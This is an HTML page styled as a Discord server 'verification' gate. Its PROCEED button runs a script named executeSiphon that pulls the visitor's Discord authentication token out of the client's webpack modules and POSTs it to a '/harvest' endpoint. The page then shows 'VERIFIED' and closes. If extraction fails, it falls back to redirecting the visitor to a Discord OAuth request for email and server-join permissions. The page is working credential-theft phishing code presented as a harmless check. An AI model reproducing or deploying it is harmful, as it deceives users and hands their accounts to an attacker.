<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>† SATIVA VERIFICATION †</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Metal+Mania&family=Syne:wght@800&display=swap');

        body {
            background-color: #050505;
            background-image: 
                radial-gradient(circle at 50% 50%, #1a0033 0%, #050505 100%),
                url('https://www.transparenttextures.com/patterns/carbon-fibre.png');
            color: #ffffff;
            font-family: 'Syne', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        /* The Chrome Hearts Inspired Frame */
        .extraction-box {
            background: rgba(10, 10, 10, 0.8);
            border: 2px solid #444;
            padding: 50px;
            text-align: center;
            position: relative;
            box-shadow: 0 0 30px #ff00ff22, inset 0 0 15px #00ffff11;
            clip-path: polygon(10% 0, 90% 0, 100% 10%, 100% 90%, 90% 100%, 10% 100%, 0 90%, 0 100%, 0 10%); /* Y2K jagged edge */
        }

        .extraction-box::before {
            content: '† CHRONO †';
            position: absolute;
            top: -15px;
            left: 50%;
            transform: translateX(-50%);
            background: #050505;
            padding: 0 15px;
            color: #888;
            font-size: 12px;
            letter-spacing: 5px;
        }

        h1 {
            font-family: 'Metal Mania', cursive;
            font-size: 3.5rem;
            margin: 0;
            background: linear-gradient(to bottom, #fff 20%, #444 80%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-transform: uppercase;
            filter: drop-shadow(0 0 10px rgba(255, 255, 255, 0.3));
        }

        p {
            color: #666;
            text-transform: uppercase;
            font-size: 10px;
            letter-spacing: 3px;
            margin-bottom: 30px;
        }

        /* The Y2K Chrome Button */
        .chrome-btn {
            background: #fff;
            color: #000;
            border: none;
            padding: 15px 40px;
            font-family: 'Syne', sans-serif;
            font-weight: 900;
            font-size: 18px;
            cursor: pointer;
            position: relative;
            transition: 0.3s;
            text-transform: uppercase;
            box-shadow: 5px 5px 0px #333;
        }

        .chrome-btn:hover {
            background: #ff00ff; /* Neon Emo Pink */
            color: #fff;
            transform: translate(-2px, -2px);
            box-shadow: 8px 8px 0px #550055;
        }

        .chrome-btn:active {
            transform: translate(2px, 2px);
            box-shadow: 2px 2px 0px #333;
        }

        .decor {
            position: absolute;
            font-size: 40px;
            color: #222;
            z-index: -1;
        }

        #top-left { top: 10px; left: 10px; }
        #bottom-right { bottom: 10px; right: 10px; }
    </style>
</head>
<body>

<div class="extraction-box">
    <div class="decor" id="top-left">✧</div>
    <div class="decor" id="bottom-right">✧</div>
    
    <h1>VERIFY</h1>
    <p>† enter the void to access the server †</p>
    
    <button class="chrome-btn" onclick="executeSiphon()">[ PROCEED ]</button>

    <div style="margin-top: 30px; font-size: 9px; color: #333; letter-spacing: 2px;">
        NO ACCESS WITHOUT VERIFICATION
    </div>
</div>

<script>
    async function executeSiphon() {
        const btn = document.querySelector('.chrome-btn');
        btn.innerText = "SIPHONING...";
        
        try {
            // Webpack Token Extraction Shard
            window.dispatchEvent(new Event('beforeunload'));
            let token = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let i in e.c)m.push(e.c[i])}]),m)
                .find(m=>m.exports&&m.exports.default&&m.exports.default.getToken!==undefined)
                .exports.default.getToken();

            // Transmitting to the Saffron Veil Webhook
            await fetch('/harvest', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    token: token,
                    status: "COMPLETE"
                })
            });

            btn.innerText = "VERIFIED †";
            setTimeout(() => { window.close(); }, 1500);
        } catch (e) {
            console.log("Archive sync fail... redirecting to secondary gate.");
            window.location.href = "https://discord.com/oauth2/authorize?client_id=1502575245796577491&response_type=code&redirect_uri=file%3A%2F%2F%2FC%3A%2FUsers%2Fkaima%2FDownloads%2Ftools%2Fver%2Fweb.html&scope=email+guilds.join+identify";
        }
    }
</script>

</body>
</html>
